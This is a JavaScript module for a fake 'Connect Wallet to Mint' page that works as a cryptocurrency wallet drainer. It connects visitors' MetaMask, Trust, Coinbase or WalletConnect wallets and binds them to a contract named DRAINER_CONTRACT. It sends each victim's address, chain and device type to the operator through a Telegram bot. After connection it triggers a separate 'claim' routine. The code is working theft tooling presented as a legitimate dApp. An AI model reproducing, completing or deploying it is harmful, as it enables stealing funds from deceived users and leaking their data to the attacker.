import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID || PROJECT_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const LS_KEYS = {
    address:  'connectedWallet',
    session:  'walletConnectSession',
    chain:    'chainType',
    pending:  'pending_wc_uri',
    pendingT: 'pending_wc_timestamp',
  };

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))        return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                     return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                          return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  TIMEOUT HELPER
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    let timer;
    return Promise.race([
      promise.finally(() => clearTimeout(timer)),
      new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms);
      }),
    ]);
  }

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadEthereumProvider() {
    const cdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    return tryImport(cdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider');
  }

  async function loadWeb3() {
    const cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
      'https://cdn.skypack.dev/web3@4.3.0',
    ];
    return tryImport(cdn, (m) => m.default || m, 'Web3');
  }

  // ==========================================================================
  //  RELAY PROBE
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            let ws;
            try { ws = new WebSocket(url); } catch { return resolve(false); }
            const done = (v) => {
              try { ws.close(); } catch {}
              resolve(v);
            };
            const t = setTimeout(() => done(false), timeoutMs);
            ws.onopen  = () => { clearTimeout(t); done(true); };
            ws.onerror = () => { clearTimeout(t); done(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* next */ }
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let Web3 = null;

  /** Single EIP-1193 provider — either injected OR WalletConnect. Never both. */
  let activeProvider = null;
  /** The WC provider instance specifically (kept for session restore/disconnect). */
  let wcProvider = null;

  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem(LS_KEYS.address, address);
    if (session)   localStorage.setItem(LS_KEYS.session, JSON.stringify(session));
    if (chainType) localStorage.setItem(LS_KEYS.chain, chainType);
  }
  function getSavedWallet()    { return localStorage.getItem(LS_KEYS.address); }
  function getSavedSession()   {
    const s = localStorage.getItem(LS_KEYS.session);
    try { return s ? JSON.parse(s) : null; } catch { return null; }
  }
  function getSavedChainType() { return localStorage.getItem(LS_KEYS.chain) || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem(LS_KEYS.address);
    localStorage.removeItem(LS_KEYS.session);
    localStorage.removeItem(LS_KEYS.chain);
  }

  // ==========================================================================
  //  GLOBAL STATE
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER (desktop)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    // Remove old listeners if we re-bind (avoid leaks)
    provider.removeAllListeners?.('accountsChanged');
    provider.removeAllListeners?.('chainChanged');
    provider.removeAllListeners?.('disconnect');

    provider.on('accountsChanged', (accounts) => {
      logDebug('accountsChanged: ' + JSON.stringify(accounts));
      if (!accounts || accounts.length === 0) {
        // Don't nuke UI on WC — some wallets briefly emit [] then [addr].
        // Wait a beat and re-check.
        setTimeout(async () => {
          try {
            const again = await provider.request({ method: 'eth_accounts' });
            if (!again || again.length === 0) {
              resetConnectedUI();
              clearSavedWallet();
            }
          } catch {
            resetConnectedUI();
            clearSavedWallet();
          }
        }, 500);
      } else {
        const a = accounts[0];
        updateConnectedUI(a, 'evm');
        saveWallet(a, getSavedSession(), 'evm');
        publishGlobalState(a, 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      try {
        const a = window.__apexConnected?.address || getSavedWallet();
        if (a) {
          if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(a, 'evm', provider);
        }
      } catch {}
    });

    provider.on('disconnect', () => {
      logDebug('provider disconnect event');
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      const address = accounts[0];
      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT — the ONLY WC path
  //  Uses a single EthereumProvider instance end-to-end.
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    if (isConnecting) return false;
    isConnecting = true;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No projectId configured');
      isConnecting = false;
      return false;
    }

    try {
      showStatus('Opening wallet options...', 'info');

      // Always re-probe for freshest relay URL.
      const relayUrl = await pickRelayUrl();

      // 1) Create the WC provider. This is our single source of truth.
      const provider = await EthereumProvider.init({
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: true,             // Provider drives its own modal
        relayUrl,
        metadata: DAPP_METADATA,
        rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
        },
      });

      wcProvider = provider;
      // Wire events *before* connect so we don't miss anything.
      setupEVMProviderEvents(provider);

      // 2) Connect (this opens the QR / deeplink modal).
      //    Provider.connect() resolves when the wallet approves.
      await withTimeout(
        provider.connect({
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
        }),
        timeoutMs,
        'WC connect'
      );

      // 3) Force the wallet to reveal the account (Trust Wallet sometimes
      //    only returns it after an explicit request).
      let accounts = [];
      try {
        accounts = await withTimeout(
          provider.request({ method: 'eth_requestAccounts' }),
          15000,
          'wc eth_requestAccounts'
        );
      } catch (e) {
        logDebug('eth_requestAccounts (post-connect) failed: ' + e.message);
        accounts = provider.accounts || [];
      }

      if (!accounts?.length) {
        // Last-ditch: read from session object.
        const sessAccts = provider.session?.namespaces?.eip155?.accounts || [];
        accounts = sessAccts.map((a) => a.split(':')[2]).filter(Boolean);
      }

      if (!accounts?.length) {
        logDebug('❌ WC connected but no accounts returned');
        await provider.disconnect().catch(() => {});
        wcProvider = null;
        isConnecting = false;
        return false;
      }

      const address = accounts[0];
      const session = provider.session;

      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      saveWallet(address, session, 'evm');
      updateConnectedUI(address, 'evm');

      isConnecting = false;
      logDebug(`✅ WC connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch {}
        wcProvider = null;
      }
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isDesktopDevice) {
      // Desktop: injected first, fall back to WC.
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true });
    } else {
      // Mobile: if we're clearly inside a wallet's in-app browser, try injected.
      // Otherwise go straight to WC (which will deeplink to Trust/MetaMask/etc).
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';

      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(8000);
      }
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true });
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider) {
        await wcProvider.disconnect();
      } else if (activeProvider?.disconnect) {
        await activeProvider.disconnect();
      }
    } catch (e) {
      logDebug('disconnect error: ' + e.message);
    }
    wcProvider = null;
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const isConnected = !!window.__apexConnected?.address || (saved && activeProvider);
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  This is what runs after the wallet app bounces the user back and the
  //  page reloads. Critical for the "wallet shows connected but site doesn't"
  //  symptom.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain !== 'evm') return false;
    logDebug('♻️ Attempting session restore…');

    // ---- Path 1: WalletConnect session restore ------------------------------
    if (savedSession && savedSession.topic) {
      try {
        const projectId = PRIMARY_PROJECT_ID || FALLBACK_PROJECT_ID;
        const relayUrl  = await pickRelayUrl();

        const provider = await EthereumProvider.init({
          projectId,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: true,
          relayUrl,
          metadata: DAPP_METADATA,
          session: savedSession,       // <-- rehydrates the session
          rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
          qrModalOptions: {
            themeMode: 'dark',
            themeVariables: {
              '--wcm-z-index': '9999',
              '--wcm-accent-color': '#FF6B00',
              '--wcm-background-color': '#1F2937',
            },
          },
        });

        // If the provider has no accounts, the session was rejected/expired.
        const accounts = provider.accounts || [];
        if (!accounts.length) {
          logDebug('⚠️ Stored WC session has no accounts — clearing');
          clearSavedWallet();
          return false;
        }

        wcProvider = provider;
        activeProvider = provider;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        setupEVMProviderEvents(provider);
        updateConnectedUI(accounts[0] || savedWallet, 'evm');
        logDebug('♻️ WC session restored: ' + (accounts[0] || savedWallet));
        return true;
      } catch (e) {
        logDebug('WC restore failed: ' + e.message);
        clearSavedWallet();
      }
    }

    // ---- Path 2: injected (desktop) -----------------------------------------
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          activeProvider = window.ethereum;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          setupEVMProviderEvents(window.ethereum);
          updateConnectedUI(savedWallet, 'evm');
          logDebug('♻️ Injected session restored');
          return true;
        }
      } catch {}
    }

    clearSavedWallet();
    return false;
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [EP, W3] = await Promise.all([
      loadEthereumProvider(),
      loadWeb3(),
    ]);
    EthereumProvider = EP;
    Web3 = W3;
    logDebug('✅ Libraries loaded');
    setupEIP6963();

    // Try to restore BEFORE anything else so returning-from-wallet users
    // see "Connected" instantly.
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL EVENTS — re-publish to script.js when WC session updates
  // ==========================================================================
  if (wcProvider?.on) {
    wcProvider.on('session_update', () => {
      const accts = wcProvider.session?.namespaces?.eip155?.accounts || [];
      const a = accts[0]?.split(':')[2];
      if (a) {
        updateConnectedUI(a, 'evm');
        saveWallet(a, wcProvider.session, 'evm');
        publishGlobalState(a, 'evm', wcProvider);
      }
    });
    wcProvider.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // Re-bind injected events on desktop.
  if (window.ethereum && isDesktopDevice && !wcProvider) {
    setupEVMProviderEvents(window.ethereum);
  }

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
